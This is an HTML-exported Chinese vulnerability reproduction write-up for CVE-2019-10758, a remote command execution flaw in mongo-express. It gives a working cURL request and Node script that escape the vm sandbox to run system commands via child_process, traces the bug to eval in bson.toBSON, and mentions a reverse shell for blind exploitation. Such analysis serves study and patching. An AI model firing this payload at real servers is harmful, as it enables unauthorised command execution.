<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xb494e29154c12c5e130449402b78837168b7e3f"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-10758</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Mongo expres </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h2 class="cs868C439D">
			<a name="curl-exploit"><span class="csB2D98684">cURL exploit</span></a></h2>
		<p class="cs3A447A38"><span class="cs9FB05234">curl &#39;http://localhost:8081/checkValid&#39; -H &#39;Authorization: Basic YWRtaW46cGFzcw==&#39; &nbsp;--data &#39;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#39;</span></p><h2 class="cs868C439D">
			<a name="script-exploit"><span class="csB2D98684">Script exploit</span></a></h2>
		<p class="cs3A447A38"><span class="cs9FB05234">node main.js</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">exploit = &quot;this.constructor.constructor(\&quot;return process\&quot;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;)&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">var bson = require(&#39;mongo-express/lib/bson&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bson.toBSON(exploit)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">很明显从</span><span class="cs8926E06"> exploit </span><span class="cs9C1B1871">中我们能明显得出以下两个结论：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">存在</span><span class="cs8926E06"> RCE </span><span class="cs9C1B1871">漏洞的代码位于</span><span class="cs8926E06"> </span><span class="cs9FB05234">mongo-express/lib/bson</span></li><li class="cs63189908"><span class="cs9C1B1871">路由</span><span class="cs8926E06"> </span><span class="cs9FB05234">/checkValid</span><span class="cs8926E06"> </span><span class="cs9C1B1871">从外部接收输入，并调用了存在</span><span class="cs8926E06"> RCE </span><span class="cs9C1B1871">漏洞的代码，由此存在被攻击的风险</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先定位可以接受外界输入的路由</span><span class="cs8926E06"> <a class="cs508254C" href="https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/router.js："><span class="cs4B51D5E4">https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/router.js</span><span class="cs1C2E50E7">：</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先定位可以接受外界输入的路由</span><span class="cs8926E06"> <a class="cs508254C" href="https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/router.js："><span class="cs4B51D5E4">https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/router.js</span><span class="cs1C2E50E7">：</span></a></span></p><p class="cs3A447A38"><span class="cs9FB05234">const router = function (config) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// </span><span class="cs7FFD2630">省略其他无关代码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;const appRouter = express.Router();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;appRouter.post(&#39;/checkValid&#39;, mongoMiddleware, configuredRoutes.checkValid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return appRouter;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续定位</span><span class="cs8926E06"> <a class="cs508254C" href="https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/routes/document.js："><span class="cs4B51D5E4">https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/routes/document.js</span><span class="cs1C2E50E7">：</span></a></span></p><p class="cs3A447A38"><span class="cs9FB05234">var routes = function (config) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// </span><span class="cs7FFD2630">省略其他无关代码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var exp = {};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;exp.checkValid = function (req, res) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var doc = req.body.document;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bson.toBSON(doc);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (err) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.error(err);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return res.send(&#39;Invalid&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res.send(&#39;Valid&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return exp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以很明显看到这里会从</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">请求中读取</span><span class="cs8926E06"> </span><span class="cs9FB05234">document</span><span class="cs8926E06"> </span><span class="cs9C1B1871">并作为参数继续调用</span><span class="cs8926E06"> </span><span class="cs9FB05234">bson.toBSON(doc);</span><span class="cs9C1B1871">，而根据我们之前的分析，漏洞代码有</span><span class="cs8926E06"> 99% </span><span class="cs9C1B1871">的可能性位于</span><span class="cs8926E06"> </span><span class="cs9FB05234">bson.toBSON</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数内，所以继续分析源码，</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/bson.js："><span class="cs4B51D5E4">https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/bson.js</span><span class="cs1C2E50E7">：</span></a></span></p><p class="cs3A447A38"><span class="cs9FB05234">var mongodb = require(&#39;mongodb&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var vm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= require(&#39;vm&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var json &nbsp;&nbsp;&nbsp;= require(&#39;./json&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// </span><span class="cs7FFD2630">省略一些无关代码</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//JSON.parse doesn&#39;t support BSON data types</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//Document is evaluated in a vm in order to support BSON data types</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//Sandbox contains BSON data type functions from node-mongodb-native</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">exports.toBSON = function (string) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var sandbox = exports.getSandbox();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;string = string.replace(/ISODate\(/g, &#39;new ISODate(&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;string = string.replace(/Binary\((&quot;[^&quot;]+&quot;),/g, &#39;Binary(new Buffer($1, &quot;base64&quot;),&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;return sandbox.doc;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">};</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// This function as the name suggests attempts to parse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// the free form string in to BSON, since the possibilities of failure</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// are higher, this function uses a try..catch</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">exports.toSafeBSON = function (string) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var bsonObject = exports.toBSON(string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return bsonObject;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;} catch (err) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">};</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">重点出现！</span><span class="cs8926E06">&gt;&gt;&gt; </span><span class="cs9FB05234">vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">对</span><span class="cs8926E06"> nodejs </span><span class="cs9C1B1871">的沙箱逃逸有所关注的朋友很容易就能注意到这段代码和</span><span class="cs8926E06"> vm </span><span class="cs9C1B1871">沙盒逃逸代码</span><span class="cs8926E06"> demo </span><span class="cs9C1B1871">的惊人相似：</span></p><p class="cs3A447A38"><span class="cs9FB05234">const vm = require(&#39;vm&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">vm.runInNewContext(&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这里，由于用户输入的最终会被拼接上</span><span class="cs8926E06"> </span><span class="cs9FB05234">eval</span><span class="cs9C1B1871">，所以很容易就能导致</span><span class="cs8926E06"> RCE</span><span class="cs9C1B1871">。可以看到作者的</span><span class="cs8926E06"> exploit </span><span class="cs9C1B1871">就是获得全局上下文后直接导入</span><span class="cs8926E06"> </span><span class="cs9FB05234">child_process</span><span class="cs8926E06"> </span><span class="cs9C1B1871">来执行系统命令：</span></p><p class="cs3A447A38"><span class="cs9FB05234">this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mongo_DB/%ef%bc%88CVE-2019-10758%ef%bc%89Mongo%20expres%20rce_files/image0.png" width="560" height="361" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不过由于这是个没有回显的</span><span class="cs8926E06"> RCE</span><span class="cs9C1B1871">，因此在实际漏洞利用的时候可能需要反弹</span><span class="cs8926E06"> shell </span><span class="cs9C1B1871">之类的操作</span></p></body>
</html>
